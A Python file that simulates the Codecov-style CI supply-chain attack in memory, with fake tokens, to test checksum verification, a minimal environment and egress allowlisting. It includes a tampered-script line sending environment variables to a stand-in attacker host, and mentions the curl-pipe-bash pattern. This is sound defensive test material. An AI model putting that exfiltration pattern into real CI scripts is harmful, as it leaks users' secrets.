"""Simulation of the Codecov-style attack pattern (Jan to Apr 2021, hedged).

Public reporting says: attackers changed a hosted Bash Uploader script so that, when customers' CI
jobs ran it, it also sent the job's environment variables (tokens, keys) to an attacker server.
Here the "script" is a list of toy operations and the "attacker server" is an in-memory canary sink.
Nothing is downloaded, executed in a shell or sent anywhere.

The defenses we test:
  * verify a checksum, published through a separate channel, BEFORE running the script
  * give the job only the variables it needs (minimal CI environment)
  * egress allowlist (the exfil target is not an allowed host)
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass, field

ATTACKER_HOST = "collector.attacker.example"
GOOD_HOST = "uploader-api.vendor.example"

GOOD_SCRIPT = """\
collect_coverage
upload https://uploader-api.vendor.example/v1/report
"""

# The tampered script has one extra line: "send_env" to the attacker host.
TAMPERED_SCRIPT = GOOD_SCRIPT + f"send_env https://{ATTACKER_HOST}/c\n"


def sha256(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


@dataclass
class Sink:
    """Stands for the attacker's collection server. Records what arrives."""
    received: list[dict[str, str]] = field(default_factory=list)


@dataclass
class Result:
    executed: bool
    reason: str
    leaked: dict[str, str]


def host_of(url: str) -> str:
    return url.split("//", 1)[1].split("/", 1)[0]


def run_script(script: str, env: dict[str, str], sink: Sink, allowed_hosts: set[str] | None = None) -> dict[str, str]:
    """Toy interpreter. Returns what reached the attacker sink in this run."""
    leaked: dict[str, str] = {}
    for line in script.splitlines():
        op, _, arg = line.partition(" ")
        if op == "send_env":
            if allowed_hosts is not None and host_of(arg) not in allowed_hosts:
                continue  # egress control blocks the connection
            sink.received.append(dict(env))
            leaked = dict(env)
        # collect_coverage / upload are harmless no-ops here
    return leaked


def minimal_env(env: dict[str, str], needed: set[str]) -> dict[str, str]:
    return {k: v for k, v in env.items() if k in needed}


def ci_job(
    download: str,
    env: dict[str, str],
    sink: Sink,
    published_sha256: str | None = None,
    needed_vars: set[str] | None = None,
    allowed_hosts: set[str] | None = None,
) -> Result:
    """One CI job step: 'curl <uploader> | bash' done safely or not, depending on options."""
    if published_sha256 is not None and sha256(download) != published_sha256:
        return Result(False, "checksum mismatch: refusing to run the script", {})
    job_env = minimal_env(env, needed_vars) if needed_vars is not None else env
    leaked = run_script(download, job_env, sink, allowed_hosts)
    return Result(True, "ran", leaked)


CI_ENV = {
    "CODECOV_TOKEN": "FAKE-codecov-token-aaaa",
    "AWS_SECRET_ACCESS_KEY": "FAKE-aws-secret-bbbb",
    "NPM_TOKEN": "FAKE-npm-token-cccc",
    "GITHUB_REF": "refs/heads/main",
}
